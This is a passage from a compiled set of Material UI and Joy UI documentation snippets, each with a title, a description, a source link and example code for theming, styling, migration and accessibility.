https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\nimport * as React from 'react';\nimport { CacheProvider } from '@emotion/react';\nimport createCache from '@emotion/cache';\n\nconst cache = createCache({\n  key: 'css',\n  prepend: true,\n});\n\nexport default function PlainCssPriority() {\n  return (\n    <CacheProvider value={cache}>\n      {/* Your component tree. Now you can override Material UI's styles. */}\n    </CacheProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Drawer Modal Props\nDESCRIPTION: Example showing how to configure the Modal props of a temporary drawer, specifically the keepMounted property which affects DOM presence of drawer contents.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/drawers/drawers.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Drawer\n  variant=\"temporary\"\n  ModalProps={{\n    keepMounted: false,\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Adding Accessibility Labels to Radio Component\nDESCRIPTION: Example showing how to add accessibility attributes like aria-label to a Radio component using slotProps for the input element.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/radio-button/radio-button.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Radio\n  value=\"radioA\"\n  slotProps={{\n    input: {\n      'aria-label': 'Radio A',\n    },\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Fixing White Space Nowrap in Stack Components\nDESCRIPTION: Solution for handling white-space: nowrap within Stack components by setting minWidth: 0 to prevent overflow issues.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/stack/stack.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Stack direction=\"row\" sx={{ minWidth: 0 }}>\n  <span style={{ whiteSpace: 'nowrap' }}>\n```\n\n----------------------------------------\n\nTITLE: Configuring Primary Colors in MUI Joy UI Theme\nDESCRIPTION: Defines primary color palette and its variants for both light and dark themes. Includes color codes and various component states like plain, outlined, soft, and solid variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst primary = {\n  50: '#F4FAFF',\n  100: '#DDF1FF',\n  200: '#ADDBFF',\n  300: '#6FB6FF',\n  400: '#3990FF',\n  500: '#096BDE',\n  600: '#054DA7',\n  700: '#02367D',\n  800: '#072859',\n  900: '#00153C',\n};\n\nextendTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        primary: {\n          ...primary,\n          plainColor: `var(--joy-palette-primary-600)`,\n          plainHoverBg: `var(--joy-palette-primary-100)`,\n          plainActiveBg: `var(--joy-palette-primary-200)`,\n          plainDisabledColor: `var(--joy-palette-primary-200)`,\n\n          outlinedColor: `var(--joy-palette-primary-500)`,\n          outlinedBorder: `var(--joy-palette-primary-200)`,\n          outlinedHoverBg: `var(--joy-palette-primary-100)`,\n          outlinedHoverBorder: `var(--joy-palette-primary-300)`,\n          outlinedActiveBg: `var(--joy-palette-primary-200)`,\n          outlinedDisabledColor: `var(--joy-palette-primary-100)`,\n          outlinedDisabledBorder: `var(--joy-palette-primary-100)`,\n\n          softColor: `var(--joy-palette-primary-600)`,\n          softBg: `var(--joy-palette-primary-100)`,\n          softHoverBg: `var(--joy-palette-primary-200)`,\n          softActiveBg: `var(--joy-palette-primary-300)`,\n          softDisabledColor: `var(--joy-palette-primary-300)`,\n          softDisabledBg: `var(--joy-palette-primary}-)50`,\n\n          solidColor: '#fff',\n          solidBg: `var(--joy-palette-primary-500)`,\n          solidHoverBg: `var(--joy-palette-primary-600)`,\n          solidActiveBg: `var(--joy-palette-primary-700)`,\n          solidDisabledColor: `#fff`,\n          solidDisabledBg: `var(--joy-palette-primary-200)`,\n        },\n      },\n    },\n    dark: {\n      palette: {\n        primary: {\n          ...primary,\n          plainColor: `var(--joy-palette-primary-300)`,\n          plainHoverBg: `var(--joy-palette-primary-800)`,\n          plainActiveBg: `var(--joy-palette-primary-700)`,\n          plainDisabledColor: `var(--joy-palette-primary-800)`,\n\n          outlinedColor: `var(--joy-palette-primary-200)`,\n          outlinedBorder: `var(--joy-palette-primary-700)`,\n          outlinedHoverBg: `var(--joy-palette-primary-800)`,\n          outlinedHoverBorder: `var(--joy-palette-primary-600)`,\n          outlinedActiveBg: `var(--joy-palette-primary-900)`,\n          outlinedDisabledColor: `var(--joy-palette-primary-800)`,\n          outlinedDisabledBorder: `var(--joy-palette-primary-800)`,\n\n          softColor: `var(--joy-palette-primary-200)`,\n          softBg: `var(--joy-palette-primary-900)`,\n          softHoverBg: `var(--joy-palette-primary-800)`,\n          softActiveBg: `var(--joy-palette-primary-700)`,\n          softDisabledColor: `var(--joy-palette-primary-800)`,\n          softDisabledBg: `var(--joy-palette-primary-900)`,\n\n          solidColor: `#fff`,\n          solidBg: `var(--joy-palette-primary-600)`,\n          solidHoverBg: `var(--joy-palette-primary-700)`,\n          solidActiveBg: `var(--joy-palette-primary-800)`,\n          solidDisabledColor: `var(--joy-palette-primary-700)`,\n          solidDisabledBg: `var(--joy-palette-primary-900)`,\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Enabling CSS Layers in Material UI v7 with Next.js App Router (TSX)\nDESCRIPTION: Demonstrates how to enable the opt-in CSS layer support in Material UI v7 within a Next.js App Router application. It involves wrapping the application layout with `AppRouterCacheProvider` from `@mui/material-nextjs/v15-appRouter` and setting the `enableCssLayer` option to `true`. A `GlobalStyles` component is also used to define the desired order of CSS layers (`theme`, `base`, `mui`, `components`, `utilities`), allowing for better integration with other CSS methodologies like Tailwind CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v7-is-here.md#2025-04-22_snippet_1\n\nLANGUAGE: tsx\nCODE:\n```\n// App Router only, support for Pages Router is coming soon\n\n// app/layout.tsx\nimport { AppRouterCacheProvider } from '@mui/material-nextjs/v15-appRouter';\nimport GlobalStyles from '@mui/material/GlobalStyles';\n\nexport default function RootLayout(props) {\n  const { children } = props;\n  return (\n    <html lang=\"en\">\n      <body className={roboto.variable}>\n        <AppRouterCacheProvider options={{ enableCssLayer: true }}>\n          <GlobalStyles styles=\"@layer theme,base,mui,components,utilities;\" />\n          <ThemeProvider theme={theme}>{children}</ThemeProvider>\n        </AppRouterCacheProvider>\n      </body>\n    </html>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Extended FAB Size Implementation\nDESCRIPTION: Demonstrates the implementation of extended Floating Action Buttons with different sizes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/floating-action-button/floating-action-button.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nFloatingActionButtonExtendedSize.js\n```\n\n----------------------------------------\n\nTITLE: Styling a MUI Button Using the sx Prop with Spacing Shortcuts - JavaScript\nDESCRIPTION: This JavaScript example uses the sx prop available on MUI components to take advantage of spacing shortcut properties like 'mx: 1'. It imports Button from '@mui/material/Button' and defines a functional component that applies these styles to its children. No additional styling dependencies are needed except @mui/material.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nimport Button from '@mui/material/Button';\n\nconst MyStyledButton = (props) => (\n  <Button\n    sx={{\n      mx: 1, // \\u2714\\ufe0f this shortcut is specific to the `sx` prop,\n    }}\n  >\n    {props.children}\n  </Button>\n);\n```\n\n----------------------------------------\n\nTITLE: Setting Width Percentages with Material-UI Box Component\nDESCRIPTION: Demonstrates how to set various width percentages using the Box component's sx prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/sizing/sizing.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ width: '25%' }}>…\n<Box sx={{ width: '50%' }}>…\n<Box sx={{ width: '75%' }}>…\n<Box sx={{ width: '100%' }}>…\n<Box sx={{ width: 'auto' }}>…\n```\n\n----------------------------------------\n\nTITLE: Switch Component with Custom Role\nDESCRIPTION: Example of changing the Switch component's ARIA role using slotProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/switch/switch.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Switch slotProps={{ input: { role: 'switch' } }}>\n```\n\n----------------------------------------\n\nTITLE: Configuring Vite Plugin for Pigment CSS\nDESCRIPTION: JavaScript configuration for integrating the Pigment CSS plugin with Vite, defining transformation options for Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_5\n\nLANGUAGE: js\nCODE:\n```\nimport { defineConfig } from 'vite';\nimport { pigment } from '@pigment-css/vite-plugin';\n\n/**\n * @type {import('@pigment-css/vite-plugin').PigmentOptions}\n */\nconst pigmentConfig = {\n  transformLibraries: ['@mui/material'],\n};\n\nexport default defineConfig({\n  plugins: [\n    pigment(pigmentConfig),\n    // ... Your other plugins.\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Applying Margin Spacing with sx Prop and System Keys - MUI - JSX\nDESCRIPTION: Demonstrates how to use the sx prop and system property keys (mb) in a MUI Button or Box component to set margin-bottom using the spacing system. Dependencies: @mui/material Button and Box components, theme provider context. The mb key takes a numeric value, which is mapped via theme.spacing to a pixel value in the generated CSS. Expected input: a numeric value (e.g., 3) for the mb or marginBottom key. Output: the element has margin-bottom as determined by the theme spacing.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/properties/properties.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n<Button sx={{ mb: 3 }} />\n\n// or\n<Box mb={3}>\n// or\n<Box marginBottom={3}>\n```\n\n----------------------------------------\n\nTITLE: Configuring CSS Injection Order with StyledEngineProvider\nDESCRIPTION: Demonstrates how to control CSS injection order to ensure custom styles have precedence over Material-UI's default styles. Uses StyledEngineProvider with the injectFirst prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_12\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { StyledEngineProvider } from '@mui/material/styles';\n\nexport default function GlobalCssPriority() {\n  return (\n    <StyledEngineProvider injectFirst>\n      {/* Your component tree. Now you can override Material UI's styles. */}\n    </StyledEngineProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Textarea Implementation in React with Joy UI\nDESCRIPTION: Basic implementation of the Textarea component from Joy UI. This snippet shows the minimum code required to use the component in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/textarea/textarea.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Textarea from '@mui/joy/Textarea';\n\nexport default function MyApp() {\n  return <Textarea placeholder=\"Type anything…\" />;\n}\n```\n\n----------------------------------------\n\nTITLE: Installing and Running Material UI Express SSR Project\nDESCRIPTION: Commands to install dependencies and start the server-side rendered Material UI application.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-express-ssr/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run start\n```\n\n----------------------------------------\n\nTITLE: Migrating Box Component for Pigment CSS\nDESCRIPTION: This snippet demonstrates two approaches for migrating the Box component: using the Pigment CSS-compatible version or replacing it with HTML elements.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_23\n\nLANGUAGE: diff\nCODE:\n```\n-import Box from '@mui/material/Box';\n+import Box from '@mui/material-pigment-css/Box';\n```\n\nLANGUAGE: diff\nCODE:\n```\n-import Box from '@mui/material/Box';\n\n function CustomCard() {\n   return (\n-    <Box sx={{ display: 'flex' }}>\n-      <Box component=\"img\" src=\"...\" sx={{ width: 24, height: 24 }}>\n-      ...\n-    </Box>\n+    <div sx={{ display: 'flex' }}>\n+      <img src=\"...\" sx={{ width: 24, height: 24 }}>\n+      ...\n+    </div>\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Implementing CSP in Next.js Pages Router _app.tsx\nDESCRIPTION: Setting up AppCacheProvider with nonce in Next.js _app.tsx, including a utility function to get the nonce from headers or meta tag.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/content-security-policy/content-security-policy.md#2025-04-22_snippet_6\n\nLANGUAGE: tsx\nCODE:\n```\nimport { createEmotionCache } from '@mui/material-nextjs/v15-pagesRouter';\n// other imports\n\nexport default function MyApp(props: AppProps & { nonce: string }) {\n  const { Component, pageProps, nonce } = props;\n\n  const emotionCache = useMemo(() => {\n    const nonce = props.nonce || getNonce();\n\n    return createEmotionCache({ nonce });\n  }, [props.nonce]);\n\n  return (\n    <AppCacheProvider {...props} emotionCache={emotionCache}>\n      {/* ... */}\n    </AppCacheProvider>\n  );\n}\n\nfunction getNonce(headers?: Record<string, string | string[] | undefined>) {\n  if (headers) {\n    return headers['x-nonce'] as string;\n  }\n\n  if (typeof document !== 'undefined') {\n    const nonceMeta = document.querySelector('meta[name=\"csp-nonce\"]');\n    if (nonceMeta) {\n      return nonceMeta.getAttribute('content') || undefined;\n    }\n  }\n\n  return undefined;\n}\n\nMyApp.getInitialProps = async (appContext: AppContext) => {\n  const nonce = getNonce(appContext.ctx?.req?.headers);\n  if (typeof nonce !== 'string') {\n    throw new Error('\"nonce\" header is missing');\n  }\n\n  return { ...otherProps, nonce };\n};\n```\n\n----------------------------------------\n\nTITLE: Dense Menu with Reduced Padding\nDESCRIPTION: Menu implementation with reduced padding and text size for long lists using the dense prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"DenseMenu.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Fixing SX Prop TypeScript Issues with 'as const'\nDESCRIPTION: This solution fixes the type widening issue by using TypeScript's 'as const' assertion. This narrows the type of flexDirection from string to the literal 'column', making it compatible with the SX prop's expected type.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_22\n\nLANGUAGE: typescript\nCODE:\n```\nconst style = {\n  flexDirection: 'column',\n} as const;\n\nexport default function App() {\n  return <Button sx={style}>Example</Button>;\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Grid Import Statements for Material UI v5\nDESCRIPTION: Shows how to update import statements when migrating from Grid to Unstable_Grid2 in Material UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n// The legacy Grid component is named Grid\n-import Grid from '@mui/material/Grid';\n\n// The updated Grid component is named Unstable_Grid2\n+import Grid from '@mui/material/Unstable_Grid2';\n```\n\n----------------------------------------\n\nTITLE: Accessible Text Field Structure in Material-UI\nDESCRIPTION: Illustrates the correct DOM structure for an accessible text field, linking the input to its label and helper text using appropriate ARIA attributes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/text-fields/text-fields.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<div class=\"form-control\">\n  <label for=\"my-input\">Email address</label>\n  <input id=\"my-input\" aria-describedby=\"my-helper-text\" />\n  <span id=\"my-helper-text\">We'll never share your email.</span>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Using Individual Style Functions from MUI System\nDESCRIPTION: Demonstrates how to import and use specific style functions from MUI System independently for bundle size optimization. Shows combination of multiple style utilities to create custom styling logic.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/custom-components/custom-components.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport { styled } from '@mui/system';\nimport { spacing, palette } from '@mui/system';\n\nconst Div = styled('div')(spacing, palette);\n\nexport default function CombiningStyleFunctionsDemo() {\n  return (\n    <Div\n      p={2}\n      bgcolor=\"primary.main\"\n      color=\"white\"\n    >\n      Custom component using individual style functions\n    </Div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Click-Away Listener in Material-UI\nDESCRIPTION: This snippet shows how to import the Click-Away Listener component from Material-UI. It's the first step in using the component in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/click-away-listener/click-away-listener.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport ClickAwayListener from '@mui/material/ClickAwayListener';\n```\n\n----------------------------------------\n\nTITLE: Implementing Accessible Badges in React Material-UI\nDESCRIPTION: Demonstrates how to make badges accessible using aria-label for screen readers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/badges/badges.md#2025-04-22_snippet_9\n\nLANGUAGE: JSX\nCODE:\n```\nAccessibleBadges.js\n```\n\n----------------------------------------\n\nTITLE: Replacing Nested Class Selectors with Global Class Names\nDESCRIPTION: Example demonstrating how to replace nested class selectors with global class names when migrating from JSS to Emotion in theme styleOverrides.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n const theme = createTheme({\n   components: {\n     MuiOutlinedInput: {\n       styleOverrides: {\n         root: {\n-          '& $notchedOutline': {\n+          '& .MuiOutlinedInput-notchedOutline': {\n             borderWidth: 1,\n           }\n         }\n       }\n     }\n   }\n });\n```\n\n----------------------------------------\n\nTITLE: Setting Align Items with Material-UI Box Component in JSX\nDESCRIPTION: Shows how to align flex items along the cross axis using the alignItems property. Options include flex-start, flex-end, center, stretch, and baseline.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ alignItems: 'flex-start' }}>…\n<Box sx={{ alignItems: 'flex-end' }}>…\n<Box sx={{ alignItems: 'center' }}>…\n<Box sx={{ alignItems: 'stretch' }}>…\n<Box sx={{ alignItems: 'baseline' }}>…\n```\n\n----------------------------------------\n\nTITLE: Custom Numeric Spacing Configuration\nDESCRIPTION: Shows how to customize spacing by providing a number value to modify the base spacing unit\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/spacing/spacing.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme({\n  spacing: 4,\n});\n\ntheme.spacing(2); // `${4 * 2}px` = '8px'\n```\n\n----------------------------------------\n\nTITLE: Composing a Custom Tree Item Component Using useTreeItem – JavaScript (React)\nDESCRIPTION: This JavaScript snippet demonstrates a React functional component that customizes a Tree Item in MUI Rich Tree View using the useTreeItem hook and context providers. It utilizes React.forwardRef for ref forwarding, receives props defined by the TreeItemProps interface, and composes the item using low-level utilities for context, root, content, and transitions. The code highlights extensibility, allowing developers to tailor node rendering while retaining built-in functionality. Dependencies include React and MUI Tree View context APIs.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v8.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst CustomTreeItemComponent = React.forwardRef(function CustomTreeItemComponent(\n  { id, itemId, label, disabled, children }: TreeItemProps,\n  ref: React.Ref<HTMLLIElement>,\n) {\n  const treeItemData = useTreeItem({ id, itemId, children, label, disabled, rootRef: ref });\n\n  return (\n    <TreeItemProvider {...treeItemData.getContextProviderProps()}>\n      <TreeItemRoot {...treeItemData.getRootProps()}>\n        <TreeItemContent {...treeItemData.getContentProps()}>\n          <TreeItemLabel {...treeItemData.getLabelProps()} />\n        </TreeItemContent>\n        {children && <TreeItemGroupTransition {...treeItemData.getGroupTransitionProps()} />}\n      </TreeItemRoot>\n    </TreeItemProvider>\n  );\n}\n\n```\n\n----------------------------------------\n\nTITLE: Woven Image List Implementation in Material-UI\nDESCRIPTION: Demonstrates a woven image list layout using alternating container ratios for rhythmic content presentation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/image-list/image-list.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"WovenImageList.js\"}\n```\n\n----------------------------------------\n\nTITLE: Implementing Radio Group Rating in React with Material-UI\nDESCRIPTION: Shows how to implement the Rating component as a radio group. The highlightSelectedOnly prop is used to restore the natural behavior of radio buttons.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/rating/rating.md#2025-04-22_snippet_5\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"RadioGroupRating.js\"}\n```\n\n----------------------------------------\n\nTITLE: Multiline Chip Component\nDESCRIPTION: Example of chips supporting multiline content using custom styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/chips/chips.md#2025-04-22_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as React from 'react';\nimport Chip from '@mui/material/Chip';\nimport Stack from '@mui/material/Stack';\n\nexport default function MultilineChips() {\n  return (\n    <Stack direction=\"row\" spacing={1}>\n      <Chip\n        sx={{ height: 'auto', '& .MuiChip-label': { whiteSpace: 'normal' } }}\n        label=\"This is a chip that has multiple lines.\"\n      />\n    </Stack>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating Dynamic Color Based on Palette\nDESCRIPTION: JavaScript code examples showing how to migrate from owner state-based dynamic colors to variants-based approach compatible with Pigment CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_14\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({\n  components: {\n    MuiCard: {\n      styleOverrides: {\n        root: ({ theme, ownerState }) => ({\n          color: theme.palette[ownerState.palette]?.main,\n        }),\n      },\n    },\n  },\n});\n```\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({\n  components: {\n    MuiCard: {\n      styleOverrides: {\n        root: ({ theme }) => ({\n          variants: [\n            ...Object.entries(theme.palette)\n              .filter(([, palette]) => palette && palette.main)\n              .map(([palette, { main }]) => ({\n                props: { palette },\n                style: {\n                  color: main,\n                },\n              })),\n          ],\n        }),\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Self-hosted Fonts in Material UI\nDESCRIPTION: Shows how to import and configure self-hosted fonts using CssBaseline component with font-face declaration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/typography/typography.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport RalewayWoff2 from './fonts/Raleway-Regular.woff2';\n\nconst theme = createTheme({\n  typography: {\n    fontFamily: 'Raleway, Arial',\n  },\n  components: {\n    MuiCssBaseline: {\n      styleOverrides: `\n        @font-face {\n          font-family: 'Raleway';\n          font-style: normal;\n          font-display: swap;\n          font-weight: 400;\n          src: local('Raleway'), local('Raleway-Regular'), url(${RalewayWoff2}) format('woff2');\n          unicodeRange: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF;\n        }\n      `,\n    },\n  },\n});\n\nreturn (\n  <ThemeProvider theme={theme}>\n    <CssBaseline />\n    <Box sx={{ fontFamily: 'Raleway' }}>Raleway</Box>\n  </ThemeProvider>\n);\n```\n\n----------------------------------------\n\nTITLE: Installing Vite Plugin for Pigment CSS\nDESCRIPTION: Commands for installing the Vite plugin for Pigment CSS as a development dependency using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save-dev @pigment-css/vite-plugin\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add -D @pigment-css/vite-plugin\n```\n\n----------------------------------------\n\nTITLE: Generating CSP Nonce with UUID in JavaScript\nDESCRIPTION: Code to generate an unpredictable nonce using UUID version 4, which is required for implementing CSP with Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/content-security-policy/content-security-policy.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\n----------------------------------------\n\nTITLE: Configuring Third-party Icons with Joy UI\nDESCRIPTION: Example of configuring global styles for third-party icons to work with Joy UI, including CSS variables for color, margin, and font size.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/integrations/icon-libraries/icon-libraries.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport { CssVarsProvider } from '@mui/joy/styles';\nimport GlobalStyles from '@mui/joy/GlobalStyles';\n\nfunction App() {\n  return (\n    <CssVarsProvider>\n      <GlobalStyles styles={{\n        '{selector}': {\n          color: \"var(--Icon-color)\",\n          margin: \"var(--Icon-margin)\",\n          fontSize: \"var(--Icon-fontSize, 20px)\",\n          width: \"1em\",\n          height: \"1em\"\n        }\n      }}>\n    </CssVarsProvider>\n  )\n}\n```\n\n----------------------------------------\n\nTITLE: Switch Component with ARIA Label\nDESCRIPTION: Example of adding accessibility attributes to a Switch component using slotProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/switch/switch.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Switch value=\"checkedA\" slotProps={{ 'aria-label': 'Switch A' }} />\n```\n\n----------------------------------------\n\nTITLE: Implementing Removed theme.typography.round Helper in Material-UI v5\nDESCRIPTION: This snippet provides a JavaScript function to replace the removed theme.typography.round helper in Material-UI v5. It rounds a value to 5 decimal places.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_52\n\nLANGUAGE: javascript\nCODE:\n```\nfunction round(value) {\n  return Math.round(value * 1e5) / 1e5;\n}\n```\n\n----------------------------------------\n\nTITLE: Automatic Input Dimension Adjustment in Joy UI\nDESCRIPTION: This demo showcases how the Input component in Joy UI automatically calculates and adjusts its dimensions relative to the border radius, improving developer experience.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/overview/overview.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"../../main-features/automatic-adjustment/InputVariables.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring Color Schemes in Material UI Theme JavaScript\nDESCRIPTION: This snippet shows how to configure support for multiple color schemes (light and dark) in Material UI v6 using the `colorSchemes` node within `createTheme`. Setting `dark: true` enables automatic generation and management of dark mode, simplifying theme setup. The `ThemeProvider` is used to apply the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_3\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({ colorSchemes: { dark: true } });\n// light is generated by default.\n\nfunction App() {\n  return <ThemeProvider theme={theme}>...</ThemeProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Different Styles per Color Scheme in Joy UI Theme\nDESCRIPTION: This snippet shows how to use theme.getColorSchemeSelector to apply different styles for light and dark modes in a Joy UI component. It modifies the boxShadow property of a JoyChip component, setting a shadow for light mode and removing it for dark mode.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_14\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyChip: {\n      styleOverrides: {\n        root: ({ ownerState, theme }) => ({\n          // for the default color scheme (light)\n          boxShadow: theme.vars.shadow.sm,\n\n          // the result is `[data-joy-color-scheme=\"dark\"] &`\n          [theme.getColorSchemeSelector('dark')]: {\n            boxShadow: 'none',\n          },\n        }),\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Applying Box Shadows in Material-UI (JSX)\nDESCRIPTION: This snippet demonstrates how to apply different levels of box shadows to Box components in Material-UI. It shows four levels of elevation, from 0 to 3.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/shadows/shadows.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ boxShadow: 0 }}>…\n<Box sx={{ boxShadow: 1 }}>…\n<Box sx={{ boxShadow: 2 }}>…\n<Box sx={{ boxShadow: 3 }}>…\n```\n\n----------------------------------------\n\nTITLE: Setting Typography Variants in Material-UI with JSX\nDESCRIPTION: Demonstrates how to apply different typography variants using the Box component in Material-UI. These variants are defined in the theme's typography object.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/typography/typography.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ typography: 'subtitle2' }}>… // theme.typography.subtitle2\n<Box sx={{ typography: 'body1' }}>…\n<Box sx={{ typography: 'body2' }}>…\n```\n\n----------------------------------------\n\nTITLE: Configuring Font Family in Material UI Theme\nDESCRIPTION: Demonstrates how to customize the font family in a Material UI theme using system fonts instead of the default Roboto font.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/typography/typography.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme({\n  typography: {\n    fontFamily: [\n      '-apple-system',\n      'BlinkMacSystemFont',\n      '\"Segoe UI\"',\n      'Roboto',\n      '\"Helvetica Neue\"',\n      'Arial',\n      'sans-serif',\n      '\"Apple Color Emoji\"',\n      '\"Segoe UI Emoji\"',\n      